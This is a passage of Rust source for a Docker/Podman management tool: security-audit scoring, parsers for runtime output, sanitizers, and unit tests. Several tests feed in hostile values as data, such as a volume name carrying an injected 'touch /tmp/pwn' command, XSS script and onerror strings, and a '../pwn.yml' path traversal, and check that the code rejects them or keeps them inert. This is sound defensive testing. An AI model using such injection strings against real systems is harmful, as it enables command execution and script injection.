                format!("容器 {display} 的健康检查为 unhealthy"),
                "检查容器日志和 HEALTHCHECK，修复根因后再恢复服务流量。",
            );
        }
    }
    let truncated = inventory_truncated || findings.len() == MAX_SECURITY_FINDINGS;
    findings.sort_by(|left, right| {
        left.severity
            .cmp(&right.severity)
            .then_with(|| left.container_name.cmp(&right.container_name))
            .then_with(|| left.id.cmp(&right.id))
    });
    let mut summary = DockerSecuritySummary {
        critical: 0,
        high: 0,
        medium: 0,
        low: 0,
        info: 0,
        total: findings.len(),
        score: 100,
    };
    let mut penalty = 0_u32;
    for finding in &findings {
        match finding.severity {
            DockerSecuritySeverity::Critical => summary.critical += 1,
            DockerSecuritySeverity::High => summary.high += 1,
            DockerSecuritySeverity::Medium => summary.medium += 1,
            DockerSecuritySeverity::Low => summary.low += 1,
            DockerSecuritySeverity::Info => summary.info += 1,
        }
        penalty = penalty.saturating_add(u32::from(finding.severity.score_penalty()));
    }
    summary.score = 100_u8.saturating_sub(penalty.min(100) as u8);
    DockerSecurityAudit {
        runtime,
        containers_scanned,
        findings,
        summary,
        truncated,
    }
}

const fn category_id(category: DockerSecurityCategory) -> &'static str {
    match category {
        DockerSecurityCategory::Privileged => "privileged",
        DockerSecurityCategory::Capabilities => "capabilities",
        DockerSecurityCategory::Network => "network",
        DockerSecurityCategory::Mount => "mount",
        DockerSecurityCategory::Image => "image",
        DockerSecurityCategory::ResourceLimits => "resource-limits",
        DockerSecurityCategory::Health => "health",
    }
}

const fn severity_id(severity: DockerSecuritySeverity) -> &'static str {
    match severity {
        DockerSecuritySeverity::Critical => "critical",
        DockerSecuritySeverity::High => "high",
        DockerSecuritySeverity::Medium => "medium",
        DockerSecuritySeverity::Low => "low",
        DockerSecuritySeverity::Info => "info",
    }
}

fn path_has_prefix(path: &str, prefix: &str) -> bool {
    path == prefix
        || path
            .strip_prefix(prefix)
            .is_some_and(|suffix| suffix.starts_with('/'))
}

struct BTreeMapView;

impl BTreeMapView {
    fn from_map(map: &Map<String, Value>) -> impl Iterator<Item = (&str, &Value)> {
        let mut entries = map.iter().collect::<Vec<_>>();
        entries.sort_by(|left, right| left.0.cmp(right.0));
        entries
            .into_iter()
            .map(|(name, value)| (name.as_str(), value))
    }
}

/// The leading twelve characters, which is how the runtime itself shows an id.
///
/// Only for lines a person reads. The full id stays in the operation metadata,
/// where an audit record needs it, and every command is built from the whole
/// thing — a summary is a description, never an ingredient.
fn short_id(id: &str) -> &str {
    match id.char_indices().nth(12) {
        Some((boundary, _)) => &id[..boundary],
        None => id,
    }
}

/// Reads the runtime probe's `name<TAB>state` lines.
///
/// Anything unrecognised is dropped rather than guessed at: this decides which
/// binary every later command will run, so a line that is not exactly one of
/// the two known names must not become one of them.
fn parse_runtime_probe(output: &str) -> ContainerRuntimeProbe {
    let mut probe = ContainerRuntimeProbe::default();
    for line in output.lines() {
        let Some((name, state)) = line.trim().split_once('\t') else {
            continue;
        };
        let runtime = match name {
            "docker" => ContainerRuntime::Docker,
            "podman" => ContainerRuntime::Podman,
            _ => continue,
        };
        if !probe.installed.contains(&runtime) {
            probe.installed.push(runtime);
        }
        // Docker wins when both answer, and the probe emits it first, so the
        // first usable line is the one to keep.
        if state == "usable" && probe.usable.is_none() {
            probe.usable = Some(runtime);
        }
    }
    probe
}

/// Prints the name of the best shell present, or nothing at all.
///
/// `command -v` and not `test -x /bin/bash`: some images put bash somewhere
/// else on PATH, and one that is on PATH is the one the exec will find. Ash is
/// preferred over plain sh when both resolve, because on busybox images `sh` is
/// a link to ash anyway and naming ash gets line editing.
pub(crate) const SHELL_PROBE_SCRIPT: &str = "for lr_sh in bash ash sh; do if command -v \"$lr_sh\" >/dev/null 2>&1; \
     then echo \"$lr_sh\"; exit 0; fi; done; exit 0";

pub(crate) fn parse_shell_probe(output: &str) -> CoreResult<ContainerShell> {
    // Same rule as everywhere else in here: a runtime warning may sit in front
    // of the answer, so look for the answer rather than reading line one.
    let shell = output.lines().map(str::trim).find_map(|line| match line {
        "bash" => Some(ContainerShell::Bash),
        "ash" => Some(ContainerShell::Ash),
        "sh" => Some(ContainerShell::Sh),
        _ => None,
    });
    shell.ok_or_else(|| {
        CoreError::validation(
            "container shell",
            "这个容器里没有可用的 shell（bash、ash、sh 都没有），打不开终端",
        )
    })
}

fn parse_state_probe(container: &ContainerIdentity, output: &str) -> CoreResult<String> {
    // The record, not the whole output: a runtime that greeted the command
    // with a deprecation warning would otherwise make every action impossible
    // to plan. The record is the line carrying the separator.
    let (id, state) = output
        .lines()
        .find_map(|line| line.trim().split_once('\t'))
        .ok_or_else(|| {
            CoreError::validation(
                "container state",
                "runtime returned an invalid state record",
            )
        })?;
    validate_container_id(id)?;
    if id != container.id() {
        return Err(CoreError::validation(
            "container state",
            "runtime returned a different container identity",
        ));
    }
    normalize_state(state)
}

/// Reads one JSON object per line out of a runtime's output.
///
/// Container runtimes write diagnostics to stderr and the transport folds
/// stderr into the same stream, so a perfectly good listing can arrive with a
/// deprecation notice sitting in the middle of it. Podman's cgroups-v1 warning
/// alone was enough to make every list on such a host fail to parse.
///
/// The rule is: a line that does not even begin as an object is not data and
/// is passed over; a line that begins as an object and will not parse is
/// corrupt data and is still an error. Dropping the second kind would turn a
/// truncated row into a silently shorter list.
fn json_rows(output: &str, subject: &'static str) -> CoreResult<(Vec<Map<String, Value>>, bool)> {
    let mut rows = Vec::new();
    let mut truncated = false;
    for line in output.lines().filter(|line| !line.trim().is_empty()) {
        let line = line.trim();
        if !line.starts_with('{') {
            continue;
        }
        if rows.len() == MAX_COLLECTION_ROWS {
            truncated = true;
            break;
        }
        let row: Value = serde_json::from_str(line)
            .map_err(|error| CoreError::validation(subject, error.to_string()))?;
        let object = row
            .as_object()
            .cloned()
            .ok_or_else(|| CoreError::validation(subject, "expected one JSON object per line"))?;
        rows.push(object);
    }
    Ok((rows, truncated))
}

/// A required string under whichever of these keys the runtime used.
///
/// Docker writes `ID`; Podman writes `Id`. Both are the same fact, and a
/// parser that knows only one of them cannot read the other runtime at all.
fn required_json_alias(row: &Map<String, Value>, keys: &[&str]) -> CoreResult<String> {
    for key in keys {
        if let Some(value) = row.get(*key).and_then(Value::as_str)
            && !value.is_empty()
        {
            return Ok(sanitize_line(value, 256));
        }
    }
    Err(CoreError::validation(
        "container runtime output",
        format!("missing {}", keys.join(" or ")),
    ))
}

/// The first line that says anything, from output a runtime may have padded
/// with its own diagnostics.
///
/// Used where the answer is a single word and the whole output would otherwise
/// be compared against it.
fn first_output_line(output: &str) -> &str {
    output
        .lines()
        .map(str::trim)
        .find(|line| !line.is_empty())
        .unwrap_or("")
}

/// The JSON array inside output a runtime may have prefixed with diagnostics.
///
/// `inspect` answers with one array; Podman greets the same command with a
/// deprecation warning on stderr, which the transport folds into this stream.
/// Trimming to the outermost brackets keeps that warning from costing the
/// whole audit. Anything between them that is not valid JSON still fails at
/// the parse, so this widens what is accepted without loosening what is
/// believed.
fn json_array_body(output: &str) -> &str {
    let Some(start) = output.find('[') else {
        return output;
    };
    let Some(end) = output.rfind(']') else {
        return output;
    };
    if end < start {
        return output;
    }
    &output[start..=end]
}

/// An optional string under whichever of these keys the runtime used.
fn json_alias_text(row: &Map<String, Value>, keys: &[&str], maximum: usize) -> String {
    for key in keys {
        let text = json_text(row, key, maximum);
        if !text.is_empty() {
            return text;
        }
    }
    String::new()
}

/// A flag under whichever of these keys the runtime used.
fn json_alias_bool(row: &Map<String, Value>, keys: &[&str]) -> bool {
    keys.iter().any(|key| json_bool(row, key))
}

/// The first of these that says anything.
fn first_non_empty(candidates: &[String]) -> String {
    candidates
        .iter()
        .find(|value| !value.trim().is_empty())
        .cloned()
        .unwrap_or_default()
}

/// The container's name, from a string or from a list of them.
///
/// Docker prints one name; Podman prints an array, because a container really
/// can have several. The first is the one every other tool shows, and the rest
/// are aliases the operator did not ask about here.
fn container_name(row: &Map<String, Value>) -> String {
    match row.get("Names") {
        Some(Value::Array(values)) => values
            .first()
            .map(|value| value_text(value, 256))
            .unwrap_or_default(),
        Some(value) => value_text(value, 256).trim_start_matches('/').to_owned(),
        None => String::new(),
    }
}

/// The published ports, from a string or from a list of port objects.
///
/// Docker pre-renders `127.0.0.1:8080->80/tcp`. Podman hands back structured
/// entries, so the same line is built here rather than dumping raw JSON into
/// a column an operator has to read.
fn container_ports(row: &Map<String, Value>) -> String {
    let Some(Value::Array(entries)) = row.get("Ports") else {
        return json_text(row, "Ports", 4_096);
    };
    let mut rendered = Vec::new();
    for entry in entries {
        let Some(entry) = entry.as_object() else {
            continue;
        };
        let host_port = entry.get("host_port").and_then(Value::as_u64).unwrap_or(0);
        let container_port = entry
            .get("container_port")
            .and_then(Value::as_u64)
            .unwrap_or(0);
        let protocol = entry
            .get("protocol")
            .and_then(Value::as_str)
            .unwrap_or("tcp");
        let host_ip = entry.get("host_ip").and_then(Value::as_str).unwrap_or("");
        if host_port == 0 {
            rendered.push(format!("{container_port}/{protocol}"));
        } else if host_ip.is_empty() {
            rendered.push(format!("{host_port}->{container_port}/{protocol}"));
        } else {
            rendered.push(format!(
                "{host_ip}:{host_port}->{container_port}/{protocol}"
            ));
        }
    }
    sanitize_line(&rendered.join(", "), 4_096)
}

/// A field that is a string on one runtime and a list of words on the other.
fn text_or_joined(row: &Map<String, Value>, key: &str, maximum: usize) -> String {
    match row.get(key) {
        Some(Value::Array(values)) => sanitize_line(
            &values
                .iter()
                .map(|value| value_text(value, maximum))
                .collect::<Vec<_>>()
                .join(" "),
            maximum,
        ),
        _ => json_text(row, key, maximum),
    }
}

fn required_json_text(row: &Map<String, Value>, key: &'static str) -> CoreResult<String> {
    let value = row.get(key).and_then(Value::as_str).ok_or_else(|| {
        CoreError::validation("container runtime output", format!("missing {key}"))
    })?;
    Ok(sanitize_line(value, 256))
}

fn json_text(row: &Map<String, Value>, key: &str, maximum: usize) -> String {
    row.get(key)
        .map(|value| value_text(value, maximum))
        .unwrap_or_default()
}

fn json_bool(row: &Map<String, Value>, key: &str) -> bool {
    match row.get(key) {
        Some(Value::Bool(value)) => *value,
        Some(Value::String(value)) => value.eq_ignore_ascii_case("true"),
        _ => false,
    }
}

fn value_text(value: &Value, maximum: usize) -> String {
    match value {
        Value::String(value) => sanitize_line(value, maximum),
        Value::Bool(value) => value.to_string(),
        Value::Number(value) => value.to_string(),
        Value::Null => String::new(),
        Value::Array(_) | Value::Object(_) => sanitize_line(&value.to_string(), maximum),
    }
}

/// `docker diff` / `podman diff`: one change per line, `A`, `C` or `D`, a
/// space, an absolute path. A line that is not one is counted, not guessed at.
fn parse_container_changes(container: &ContainerIdentity, output: &str) -> ContainerChanges {
    let mut items = Vec::new();
    let mut truncated = false;
    let mut unreadable_lines = 0;
    for line in output.lines() {
        let Some((marker, path)) = line.split_once(' ') else {
            if !line.trim().is_empty() {
                unreadable_lines += 1;
            }
            continue;
        };
        let kind = match marker {
            "A" => ContainerChangeKind::Added,
            "C" => ContainerChangeKind::Changed,
            "D" => ContainerChangeKind::Deleted,
            _ => {
                unreadable_lines += 1;
                continue;
            }
        };
        if !path.starts_with('/') {
            unreadable_lines += 1;
            continue;
        }
        if items.len() >= MAX_CONTAINER_CHANGES {
            truncated = true;
            break;
        }
        items.push(ContainerChange {
            kind,
            path: sanitize_line(path, MAX_CHANGE_PATH_CHARS),
        });
    }
    ContainerChanges {
        identity: container.clone(),
        items,
        truncated,
        unreadable_lines,
    }
}

/// `docker top` output: a header of column titles, then one process per
/// line, aligned with spaces. Every column but the last is one word; the last
/// is the command line, spaces and all.
fn parse_container_processes(
    container: &ContainerIdentity,
    output: &str,
) -> CoreResult<ContainerProcesses> {
    let mut lines = output.lines().filter(|line| !line.trim().is_empty());
    // A warning may come first; the header is the first line naming PID.
    let titles: Vec<String> = lines
        .by_ref()
        .find(|line| line.split_whitespace().any(|word| word == "PID"))
        .ok_or_else(|| {
            CoreError::validation(
                "container processes",
                "the runtime did not print a process table",
            )
        })?
        .split_whitespace()
        .take(MAX_PROCESS_COLUMNS)
        .map(|title| sanitize_line(title, 64))
        .collect();
    let columns = titles.len();
    let mut rows = Vec::new();
    let mut truncated = false;
    for line in lines {
        if rows.len() >= MAX_CONTAINER_PROCESSES {
            truncated = true;
            break;
        }
        let mut fields = Vec::with_capacity(columns);
        let mut rest = line.trim_start();
        for _ in 1..columns {
            let end = rest.find(char::is_whitespace).unwrap_or(rest.len());
            fields.push(sanitize_line(&rest[..end], MAX_PROCESS_FIELD_CHARS));
            rest = rest[end..].trim_start();
        }
        fields.push(sanitize_line(rest.trim_end(), MAX_PROCESS_FIELD_CHARS));
        rows.push(fields);
    }
    Ok(ContainerProcesses {
        identity: container.clone(),
        titles,
        rows,
        truncated,
    })
}

fn sanitize_line(value: &str, maximum_chars: usize) -> String {
    value
        .chars()
        .map(|character| {
            if character.is_control() {
                ' '
            } else {
                character
            }
        })
        .take(maximum_chars)
        .collect()
}

fn sanitize_multiline(value: &str, maximum_chars: usize) -> (String, bool) {
    let mut text = String::new();
    let mut truncated = false;
    for (seen, character) in value.chars().enumerate() {
        if seen == maximum_chars {
            truncated = true;
            break;
        }
        text.push(if character == '\n' || character == '\t' {
            character
        } else if character.is_control() {
            '�'
        } else {
            character
        });
    }
    (text, truncated)
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::PathBuf;
    use std::sync::atomic::{AtomicUsize, Ordering};

    use super::*;
    use crate::ssh::{SshConnectionStatus, TestSessionHarness};
    use crate::target::TargetIdentity;
    use crate::{BackendServices, PortableStore};
    use chrono::Utc;
    use uuid::Uuid;

    const CONTAINER_A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const CONTAINER_B: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    const CONTAINER_C: &str = "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";

    #[derive(Debug)]
    struct TestRoot(PathBuf);

    impl TestRoot {
        fn new() -> Self {
            let path = std::env::temp_dir().join(format!("lovelyres-docker-{}", Uuid::new_v4()));
            fs::create_dir_all(&path).unwrap();
            Self(path)
        }
    }

    impl Drop for TestRoot {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    fn test_services() -> (TestRoot, BackendServices) {
        let root = TestRoot::new();
        let store = PortableStore::prepare(root.0.clone()).unwrap();
        let services = BackendServices::new(store).unwrap();
        (root, services)
    }

    /// A terminal id the way the caller supplies one.
    fn terminal_id() -> String {
        format!("container-{}", uuid::Uuid::new_v4())
    }

    async fn terminal_test_services() -> (
        TestRoot,
        BackendServices,
        Arc<TestSessionHarness>,
        BoundSshSession,
    ) {
        let (root, services) = test_services();
        let guard = services
            .activate_target(TargetIdentity::new("connection-a").unwrap())
            .unwrap();
        let status = SshConnectionStatus {
            session_id: "session-a".to_owned(),
            connection_id: "connection-a".to_owned(),
            host: "host-a.test".to_owned(),
            port: 22,
            username: "operator".to_owned(),
            host_key_fingerprint: "SHA256:test".to_owned(),
            connected_at: Utc::now(),
        };
        let session = BoundSshSession::from_status(guard, &status, "test session").unwrap();
        let harness = Arc::new(TestSessionHarness::default());
        harness.set_execute_output(format!("{CONTAINER_A}\trunning"));
        services
            .ssh()
            .install_test_session(status, harness.clone())
            .await
            .unwrap();
        (root, services, harness, session)
    }

    #[test]
    fn typed_list_is_sorted_by_name_and_preserves_stable_ids() {
        let output = format!(
            "{{\"ID\":\"{CONTAINER_B}\",\"Names\":\"zeta\",\"Image\":\"busybox\",\"State\":\"exited\",\"Status\":\"Exited\"}}\n\
             {{\"ID\":\"{CONTAINER_A}\",\"Names\":\"alpha\",\"Image\":\"nginx\",\"State\":\"running\",\"Status\":\"Up\"}}"
        );
        let parsed = parse_container_list(ContainerRuntime::Docker, &output).unwrap();
        assert_eq!(parsed.items[0].name, "alpha");
        assert_eq!(parsed.items[0].identity.id(), CONTAINER_A);
        assert_eq!(
            parsed.items[0].identity.stable_key(),
            format!("docker:{CONTAINER_A}")
        );
    }

    #[test]
    fn network_and_volume_inventory_is_typed_sorted_and_bounded() {
        let networks = format!(
            "{{\"ID\":\"{CONTAINER_B}\",\"Name\":\"zeta\",\"Driver\":\"bridge\",\"Scope\":\"local\",\"Internal\":\"false\",\"IPv6\":false}}\n\
             {{\"ID\":\"{CONTAINER_A}\",\"Name\":\"<script>alpha</script>\",\"Driver\":\"bridge\",\"Scope\":\"local\",\"Internal\":true,\"IPv6\":\"true\"}}"
        );
        let parsed = parse_networks(ContainerRuntime::Docker, &networks).unwrap();
        assert_eq!(parsed.items[0].id, CONTAINER_A);
        assert_eq!(parsed.items[0].name, "<script>alpha</script>");
        assert!(parsed.items[0].internal);
        assert!(parsed.items[0].ipv6);
        assert_eq!(
            parsed.items[0].stable_key(),
            format!("docker:network:{CONTAINER_A}")
        );

        let labels = "<img src=x onerror=evil()>";
        let volumes = format!(
            "{{\"Name\":\"zeta-data\",\"Driver\":\"local\",\"Mountpoint\":\"/var/lib/docker/volumes/zeta/_data\",\"Scope\":\"local\",\"Labels\":{}}}\n\
             {{\"Name\":\"alpha_data\",\"Driver\":\"local\",\"Mountpoint\":\"/var/lib/docker/volumes/alpha/_data\",\"Scope\":\"local\",\"Labels\":{}}}",
            serde_json::to_string(labels).unwrap(),
            serde_json::to_string(&"x".repeat(MAX_CELL_CHARS + 100)).unwrap()
        );
        let parsed = parse_volumes(ContainerRuntime::Docker, &volumes).unwrap();
        assert_eq!(parsed.items[0].name, "alpha_data");
        assert_eq!(parsed.items[1].labels, labels);
        assert_eq!(parsed.items[0].labels.chars().count(), MAX_CELL_CHARS);
        assert_eq!(parsed.items[0].stable_key(), "docker:volume:alpha_data");
        assert!(
            parse_volumes(
                ContainerRuntime::Docker,
                "{\"Name\":\"bad; touch /tmp/pwn\",\"Driver\":\"local\"}"
            )
            .is_err()
        );
    }

    #[tokio::test]
    async fn network_and_volume_inventory_is_bound_to_the_exact_ssh_target() {
        let (_root, services, harness, session) = terminal_test_services().await;
        harness.set_execute_outputs([
            format!(
                "{{\"ID\":\"{CONTAINER_A}\",\"Name\":\"incident-net\",\"Driver\":\"bridge\",\"Scope\":\"local\",\"Internal\":false,\"IPv6\":true}}"
            ),
            "{\"Name\":\"evidence_data\",\"Driver\":\"local\",\"Scope\":\"local\",\"Labels\":\"case=alpha\"}".to_owned(),
            format!(
                r#"[{{"Id":"{CONTAINER_A}","Name":"incident-net","Driver":"bridge","Scope":"local","Internal":false,"EnableIPv6":true,"Attachable":true,"Ingress":false,"IPAM":{{"Driver":"default","Config":[{{"Subnet":"172.30.0.0/16","Gateway":"172.30.0.1"}}]}},"Containers":{{}},"Options":{{}},"Labels":{{"case":"alpha"}}}}]"#
            ),
            r#"[{"Name":"incident","Status":"running(2), exited(1)","ConfigFiles":"/srv/incident/compose.yml"}]"#.to_owned(),
        ]);

        let networks = services
            .docker()
            .networks(&session, ContainerRuntime::Docker)
            .await
            .unwrap();
        assert_eq!(networks.items.len(), 1);
        assert_eq!(networks.items[0].name, "incident-net");
        assert!(networks.items[0].ipv6);

        let volumes = services
            .docker()
            .volumes(&session, ContainerRuntime::Docker)
            .await
            .unwrap();
        assert_eq!(volumes.items.len(), 1);
        assert_eq!(volumes.items[0].name, "evidence_data");
        assert_eq!(volumes.items[0].labels, "case=alpha");

        let inspection = services
            .docker()
            .inspect_network(&session, &networks.items[0])
            .await
            .unwrap();
        assert_eq!(inspection.network.id, CONTAINER_A);
        assert_eq!(inspection.ipam[0].subnet, "172.30.0.0/16");
        assert_eq!(inspection.labels.get("case").unwrap(), "alpha");

        let projects = services
            .docker()
            .compose_projects(&session, ContainerRuntime::Docker)
            .await
            .unwrap();
        assert_eq!(projects.items.len(), 1);
        assert_eq!(projects.items[0].services, 3);
        assert_eq!(projects.items[0].running, 2);
        assert_eq!(projects.items[0].stopped, 1);

        services
            .activate_target(TargetIdentity::new("connection-b").unwrap())
            .unwrap();
        assert!(matches!(
            services
                .docker()
                .networks(&session, ContainerRuntime::Docker)
                .await,
            Err(CoreError::TargetChanged { .. })
        ));
    }

    #[tokio::test]
    async fn network_prune_deletes_only_the_confirmed_snapshot_and_journals_verification() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let inspection = serde_json::json!([{
            "Id": CONTAINER_A,
            "Name": "incident-net",
            "Driver": "bridge",
            "Scope": "local",
            "Internal": false,
            "EnableIPv6": false,
            "Attachable": true,
            "Ingress": false,
            "IPAM": {"Driver": "default", "Config": []},
            "Containers": {},
            "Options": {},
            "Labels": {"case": "alpha"}
        }])
        .to_string();
        harness.set_execute_outputs([
            format!(
                "{{\"ID\":\"{CONTAINER_B}\",\"Name\":\"bridge\",\"Driver\":\"bridge\",\"Scope\":\"local\"}}\n\
                 {{\"ID\":\"{CONTAINER_A}\",\"Name\":\"incident-net\",\"Driver\":\"bridge\",\"Scope\":\"local\"}}"
            ),
            inspection.clone(),
        ]);
        let plan = services
            .docker()
            .plan_resource_mutation(
                &session,
                DockerResourceMutationRequest::PruneNetworks {
                    runtime: ContainerRuntime::Docker,
                },
            )
            .await
            .unwrap();
        assert_eq!(plan.kind(), DockerResourceMutationKind::PruneNetworks);
        assert_eq!(
            plan.targets(),
            &[DockerResourceTarget::Network {
                id: CONTAINER_A.to_owned(),
                name: "incident-net".to_owned(),
            }]
        );
        let executor = DockerResourceMutationExecutor {
            service: services.docker(),
            session: &session,
            plan: &plan,
        };
        let command = executor.command_for(&plan.targets[0]).unwrap();
        assert_eq!(command, format!("docker network rm -- '{CONTAINER_A}'"));
        assert!(!command.contains("prune"));
        let source = include_str!("docker.rs");
        assert!(!source.contains(&["network prune", " -f"].concat()));
        assert!(!source.contains(&["volume prune", " -f"].concat()));

        let other = OperationPlan::new(session.target().clone(), "unrelated operation", true, None)
            .unwrap();
        assert!(
            services
                .docker()
                .execute_resource_mutation(
                    &session,
                    plan.clone(),
                    DangerousConfirmation::approve(&other),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        harness.set_execute_outputs([
            inspection,
            "incident-net".to_owned(),
            format!(
                "{{\"ID\":\"{CONTAINER_B}\",\"Name\":\"bridge\",\"Driver\":\"bridge\",\"Scope\":\"local\"}}\n\
                 {{\"ID\":\"{CONTAINER_C}\",\"Name\":\"created-after-confirmation\",\"Driver\":\"bridge\",\"Scope\":\"local\"}}"
            ),
        ]);
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .docker()
            .execute_resource_mutation(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verified);
        assert_eq!(outcome.affected, 1);
        assert!(outcome.verification_detail.contains("1 个已确认资源"));
        assert_eq!(services.operation_journal().entries().unwrap().len(), 2);
    }

    #[tokio::test]
    async fn resource_snapshot_change_aborts_before_mutation_and_without_journal() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let network = DockerNetwork {
            runtime: ContainerRuntime::Docker,
            id: CONTAINER_A.to_owned(),
            name: "incident-net".to_owned(),
            driver: "bridge".to_owned(),
            scope: "local".to_owned(),
            internal: false,
            ipv6: false,
        };
        let inspection = |driver: &str| {
            serde_json::json!([{
                "Id": CONTAINER_A,
                "Name": "incident-net",
                "Driver": driver,
                "Scope": "local",
                "Internal": false,
                "EnableIPv6": false,
                "Attachable": true,
                "Ingress": false,
                "IPAM": {"Driver": "default", "Config": []},
                "Containers": {},
                "Options": {},
                "Labels": {}
            }])
            .to_string()
        };
        harness.set_execute_outputs([inspection("bridge")]);
        let plan = services
            .docker()
            .plan_resource_mutation(
                &session,
                DockerResourceMutationRequest::RemoveNetwork { network },
            )
            .await
            .unwrap();
        harness.set_execute_outputs([inspection("overlay")]);
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let error = services
            .docker()
            .execute_resource_mutation(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap_err();
        assert!(error.to_string().contains("changed after confirmation"));
        assert!(services.operation_journal().entries().unwrap().is_empty());
    }

    #[tokio::test]
    async fn volume_prune_rechecks_container_mounts_and_preserves_new_volumes() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let volumes = "{\"Name\":\"alpha_data\",\"Driver\":\"local\",\"Scope\":\"local\"}\n\
             {\"Name\":\"beta_data\",\"Driver\":\"local\",\"Scope\":\"local\"}";
        let containers = format!(
            "{{\"ID\":\"{CONTAINER_A}\",\"Names\":\"worker\",\"Image\":\"busybox\",\"State\":\"running\",\"Status\":\"Up\"}}"
        );
        let container_inspection = serde_json::json!([{
            "Id": CONTAINER_A,
            "Name": "/worker",
            "Mounts": [{
                "Type": "volume",
                "Source": "/var/lib/docker/volumes/beta_data/_data",
                "Destination": "/data",
                "Mode": "rw",
                "RW": true
            }]
        }])
        .to_string();
        let volume_inspection = |name: &str| {
            serde_json::json!([{
                "Name": name,
                "Driver": "local",
                "Mountpoint": format!("/var/lib/docker/volumes/{name}/_data"),
                "Scope": "local",
                "CreatedAt": "2026-08-12T00:00:00Z",
                "Options": {},
                "Labels": {}
            }])
            .to_string()
        };
        harness.set_execute_outputs([
            volumes.to_owned(),
            containers.clone(),
            container_inspection.clone(),
            volume_inspection("alpha_data"),
            volume_inspection("beta_data"),
        ]);
        let plan = services
            .docker()
            .plan_resource_mutation(
                &session,
                DockerResourceMutationRequest::PruneVolumes {
                    runtime: ContainerRuntime::Docker,
                },
            )
            .await
            .unwrap();
        assert_eq!(
            plan.targets(),
            &[DockerResourceTarget::Volume {
                name: "alpha_data".to_owned(),
            }]
        );
        harness.set_execute_outputs([
            containers,
            container_inspection,
            volume_inspection("alpha_data"),
            "alpha_data".to_owned(),
            "{\"Name\":\"beta_data\",\"Driver\":\"local\",\"Scope\":\"local\"}\n\
             {\"Name\":\"gamma_after_confirm\",\"Driver\":\"local\",\"Scope\":\"local\"}"
                .to_owned(),
        ]);
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .docker()
            .execute_resource_mutation(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verified);
        assert_eq!(outcome.affected, 1);
    }

    #[tokio::test]
    async fn compose_action_requires_exact_path_snapshot_confirmation_and_verification() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let project = DockerComposeProject {
            runtime: ContainerRuntime::Docker,
            name: "incident".to_owned(),
            status: "running(1)".to_owned(),
            config_files: "/srv/incident/compose.yml".to_owned(),
            services: 1,
            running: 1,
            stopped: 0,
        };
        let inventory = serde_json::to_string(&[serde_json::json!({
            "Name": project.name,
            "Status": project.status,
            "ConfigFiles": project.config_files
        })])
        .unwrap();
        harness.set_execute_outputs([inventory.clone()]);
        let plan = services
            .docker()
            .plan_compose_action(
                &session,
                DockerComposeActionRequest {
                    project: project.clone(),
                    action: DockerComposeAction::Stop,
                },
            )
            .await
            .unwrap();
        assert_eq!(plan.config_files()[0].as_str(), "/srv/incident/compose.yml");
        assert_eq!(
            compose_action_command(&plan).unwrap(),
            "docker compose -p 'incident' -f '/srv/incident/compose.yml' stop"
        );

        let other = OperationPlan::new(session.target().clone(), "unrelated operation", true, None)
            .unwrap();
        assert!(
            services
                .docker()
                .execute_compose_action(
                    &session,
                    plan.clone(),
                    DangerousConfirmation::approve(&other),
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        let stopped = serde_json::json!([{
            "Name": "incident",
            "Status": "exited(1)",
            "ConfigFiles": "/srv/incident/compose.yml"
        }])
        .to_string();
        harness.set_execute_outputs([inventory, "stopped".to_owned(), stopped]);
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .docker()
            .execute_compose_action(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verified);
        assert!(outcome.verification_detail.contains("运行中的容器 0 个"));
        assert!(outcome.verification_detail.contains("配置文件与确认时一致"));
        assert_eq!(services.operation_journal().entries().unwrap().len(), 2);

        let malicious = DockerComposeProject {
            config_files: "/srv/incident/../pwn.yml".to_owned(),
            ..project
        };
        let error = services
            .docker()
            .plan_compose_action(
                &session,
                DockerComposeActionRequest {
                    project: malicious,
                    action: DockerComposeAction::Down,
                },
            )
            .await
            .unwrap_err();
        assert!(error.to_string().contains("remote path"));
    }

    #[test]
    fn network_inspection_is_exact_typed_and_preserves_hostile_text_as_data() {
        let expected = DockerNetwork {
            runtime: ContainerRuntime::Docker,
            id: CONTAINER_A.to_owned(),
            name: "old-name".to_owned(),
            driver: "bridge".to_owned(),
            scope: "local".to_owned(),
            internal: false,
            ipv6: false,
        };
        assert_eq!(
            network_inspect_command(&expected).unwrap(),
            format!("docker network inspect -- '{CONTAINER_A}'")
        );
        let output = format!(
            r#"[{{"Id":"{CONTAINER_A}","Name":"<script>incident</script>","Driver":"bridge","Scope":"local","Internal":true,"EnableIPv6":true,"Attachable":true,"Ingress":false,"IPAM":{{"Driver":"default","Config":[{{"Subnet":"10.8.0.0/24","Gateway":"10.8.0.1","IPRange":"10.8.0.128/25"}}]}},"Containers":{{"{CONTAINER_B}":{{"Name":"<img src=x onerror=evil()>","EndpointID":"endpoint","MacAddress":"02:42:0a:08:00:02","IPv4Address":"10.8.0.2/24","IPv6Address":""}}}},"Options":{{"bridge.name":"br-incident"}},"Labels":{{"hostile":"</div><script>evil()</script>"}}}}]"#
        );
        let inspection = parse_network_inspection(&expected, &output).unwrap();
        assert_eq!(inspection.network.id, CONTAINER_A);
        assert_eq!(inspection.network.name, "<script>incident</script>");
        assert!(inspection.network.internal);
        assert!(inspection.network.ipv6);
        assert!(inspection.attachable);
        assert_eq!(inspection.ipam[0].ip_range, "10.8.0.128/25");
